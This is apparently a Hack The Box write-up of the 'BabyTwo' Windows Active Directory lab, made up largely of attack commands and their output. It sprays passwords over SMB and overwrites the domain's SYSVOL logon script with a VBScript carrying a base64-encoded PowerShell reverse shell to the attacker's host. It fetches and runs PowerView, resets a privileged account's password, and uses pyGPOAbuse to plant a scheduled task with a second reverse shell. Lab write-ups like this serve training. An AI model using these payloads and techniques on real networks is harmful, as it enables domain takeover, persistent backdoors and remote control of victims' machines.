---
tags:
  - HTB
  - Windows
  - Boot2Root
  - Hacking
  - GPOAbuse
---
# Overview

| Name        | BabyTwo |
| ----------- | ------- |
| OS          | Windows |
| Base Points | Medium  |
| Status      | Done    |
# Recon
## Nmap

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ sudo nmap -sC -sV 10.129.234.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-03 02:26 CST
Nmap scan report for 10.129.234.72
Host is up (0.24s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-03 08:27:05Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: baby2.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.baby2.vl, DNS:baby2.vl, DNS:BABY2
| Not valid before: 2025-08-19T14:22:11
|_Not valid after:  2105-08-19T14:22:11
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: BABY2
|   NetBIOS_Domain_Name: BABY2
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: baby2.vl
|   DNS_Computer_Name: dc.baby2.vl
|   DNS_Tree_Name: baby2.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-01-03T08:27:48+00:00
|_ssl-date: 2026-01-03T08:28:28+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=dc.baby2.vl
| Not valid before: 2025-08-18T14:29:57
|_Not valid after:  2026-02-17T14:29:57
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-03T08:27:50
|_  start_date: N/A
```
# Enumeration

```bash
echo "10.129.234.72 baby2.vl dc.baby2.vl" | sudo tee /etc/hosts
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ crackmapexec smb baby2.vl -u 'guest' -p '' --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.72   445    DC               [+] baby2.vl\guest: 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ            
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs                            
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL                          Logon server share 
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ smbclient -U 'guest%' '//baby2.vl/homes' 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan  3 02:29:40 2026
  ..                                  D        0  Tue Aug 22 15:10:21 2023
  Amelia.Griffiths                    D        0  Tue Aug 22 15:17:06 2023
  Carl.Moore                          D        0  Tue Aug 22 15:17:06 2023
  Harry.Shaw                          D        0  Tue Aug 22 15:17:06 2023
  Joan.Jennings                       D        0  Tue Aug 22 15:17:06 2023
  Joel.Hurst                          D        0  Tue Aug 22 15:17:06 2023
  Kieran.Mitchell                     D        0  Tue Aug 22 15:17:06 2023
  library                             D        0  Tue Aug 22 15:22:47 2023
  Lynda.Bailey                        D        0  Tue Aug 22 15:17:06 2023
  Mohammed.Harris                     D        0  Tue Aug 22 15:17:06 2023
  Nicola.Lamb                         D        0  Tue Aug 22 15:17:06 2023
  Ryan.Jenkins                        D        0  Tue Aug 22 15:17:06 2023

		6126847 blocks of size 4096. 1053922 blocks available
```

```bash
Amelia.Griffiths
Carl.Moore
Harry.Shaw
Joan.Jennings
Joel.Hurst
Kieran.Mitchell
Lynda.Bailey
Mohammed.Harris
Nicola.Lamb
Ryan.Jenkins
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ crackmapexec smb 10.129.234.72 -u user.txt -p user.txt --no-bruteforce --continue-on-success 
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.72   445    DC               [-] baby2.vl\Amelia.Griffiths:Amelia.Griffiths STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Harry.Shaw:Harry.Shaw STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Joan.Jennings:Joan.Jennings STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Joel.Hurst:Joel.Hurst STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Kieran.Mitchell:Kieran.Mitchell STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Lynda.Bailey:Lynda.Bailey STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Mohammed.Harris:Mohammed.Harris STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Nicola.Lamb:Nicola.Lamb STATUS_LOGON_FAILURE 
SMB         10.129.234.72   445    DC               [-] baby2.vl\Ryan.Jenkins:Ryan.Jenkins STATUS_LOGON_FAILURE 
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ crackmapexec smb baby2.vl -u Carl.Moore -p Carl.Moore --shares
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.72   445    DC               [+] baby2.vl\Carl.Moore:Carl.Moore 
SMB         10.129.234.72   445    DC               [*] Enumerated shares
SMB         10.129.234.72   445    DC               Share           Permissions     Remark
SMB         10.129.234.72   445    DC               -----           -----------     ------
SMB         10.129.234.72   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.72   445    DC               apps            READ,WRITE      
SMB         10.129.234.72   445    DC               C$                              Default share
SMB         10.129.234.72   445    DC               docs            READ,WRITE      
SMB         10.129.234.72   445    DC               homes           READ,WRITE      
SMB         10.129.234.72   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.72   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.72   445    DC               SYSVOL          READ            Logon server share 
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ smbclient -U 'Carl.Moore%Carl.Moore' '//baby2.vl/SYSVOL'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Aug 22 12:37:36 2023
  ..                                  D        0  Tue Aug 22 12:37:36 2023
  baby2.vl                           Dr        0  Tue Aug 22 12:37:36 2023

		6126847 blocks of size 4096. 1134482 blocks available
smb: \> cd baby2.vl\
smb: \baby2.vl\> ls
  .                                   D        0  Tue Aug 22 12:43:55 2023
  ..                                  D        0  Tue Aug 22 12:37:36 2023
  DfsrPrivate                      DHSr        0  Tue Aug 22 12:43:55 2023
  Policies                            D        0  Tue Aug 22 12:37:41 2023
  scripts                             D        0  Mon Aug 25 03:30:39 2025
 
		6126847 blocks of size 4096. 1135992 blocks available
smb: \baby2.vl\> cd scripts\
smb: \baby2.vl\scripts\> ls
  .                                   D        0  Mon Aug 25 03:30:39 2025
  ..                                  D        0  Tue Aug 22 12:43:55 2023
  login.vbs                           A      992  Sat Sep  2 09:55:51 2023
ge
		6126847 blocks of size 4096. 1139038 blocks available
smb: \baby2.vl\scripts\> get login.vbs 
getting file \baby2.vl\scripts\login.vbs of size 992 as login.vbs (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ cat login.vbs 
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L
```

Replace that script with rev shell.

```python
cat > login.vbs << 'EOF'
Sub MapNetworkShare(sharePath, driveLetter)
    Dim objNetwork
    Set objNetwork = CreateObject("WScript.Network")    
  
    ' Check if the drive is already mapped
    Dim mappedDrives
    Set mappedDrives = objNetwork.EnumNetworkDrives
    Dim isMapped
    isMapped = False
    For i = 0 To mappedDrives.Count - 1 Step 2
        If UCase(mappedDrives.Item(i)) = UCase(driveLetter & ":") Then
            isMapped = True
            Exit For
        End If
    Next
    
    If isMapped Then
        objNetwork.RemoveNetworkDrive driveLetter & ":", True, True
    End If
    
    objNetwork.MapNetworkDrive driveLetter & ":", sharePath
    
    If Err.Number = 0 Then
        WScript.Echo "Mapped " & driveLetter & ": to " & sharePath
    Else
        WScript.Echo "Failed to map " & driveLetter & ": " & Err.Description
    End If
    
    Set objNetwork = Nothing
End Sub

Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADgAIgAsADQANAA0ADQAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
MapNetworkShare "\\dc.baby2.vl\apps", "V"
MapNetworkShare "\\dc.baby2.vl\docs", "L"
EOF
```

```bash
smbclient -U 'Carl.Moore%Carl.Moore' '//baby2.vl/SYSVOL' -c "cd baby2.vl\scripts; put login.vbs login.vbs"
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.234.72] 64343

PS C:\Windows\system32> 
PS C:\> cat user.txt
42783b2c1483aeb70eca6810f0645c38
```
# Privilege Escalation

![[1_TVQlBaXRJURnh1E2Sv9f2Q.webp]]

Bloodhound reveals a critical path:

1. Amelia. Griffiths is a member of the legacy group.
2. The legacy group has WriteDacl over the user GPOadm.
3. GPOadm has GenericAll over the Default Domain Policy.

```bash
iex (iwr -usebasicparsing http://10.10.15.108:8000/PowerView.ps1)
```

```bash
# Give Amelia all rights on gpoadm account
Add-DomainObjectAcl -TargetIdentity "gpoadm" -PrincipalIdentity "amelia.griffiths" -Rights All
```

```bash
# Set new password for gpoadm
$newpass = ConvertTo-SecureString '@@abc1234567' -AsPlainText -Force
Set-DomainUserPassword -Identity gpoadm -AccountPassword $newpass -Verbose
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ crackmapexec smb 10.129.234.72 -u gpoadm -p '@@abc1234567'
SMB         10.129.234.72   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.72   445    DC               [+] baby2.vl\gpoadm:@@abc1234567
```
## GPO Abuse PyGPOAbuse

With control over`gpoadm`, we can now abuse its GenericAll rights over the GPOs. We use `pyGPOAbuse` to create a malicious scheduled task within the Group Policy.

First, identify the GPO ID from Bloodhound (e.g., `31B2F340-016D-11D2-945F-00C04FB984F9`).

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~/pyGPOAbuse]
└──╼ [★]$ python3 pygpoabuse.py baby2.vl/gpoadm:'@@abc1234567' -command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADgAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" -dc-ip 10.129.234.72 -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9"

SUCCESS:root:ScheduledTask TASK_18d06c58 created!
[+] ScheduledTask TASK_18d06c58 created!
```

Force to update policy.

```bash
PS C:\temp> PS C:\temp> gpupdate

Updating policy...



Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

```bash
┌─[us-dedivip-1]─[10.10.15.108]─[at0mxploit@htb-iuikcigcae]─[~]
└──╼ [★]$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.15.108] from (UNKNOWN) [10.129.234.72] 64571

PS C:\Windows\system32> cat C:\Users\Administrator\Desktop\root.txt
293500962edc31fa154951eeeb5740f9
```

---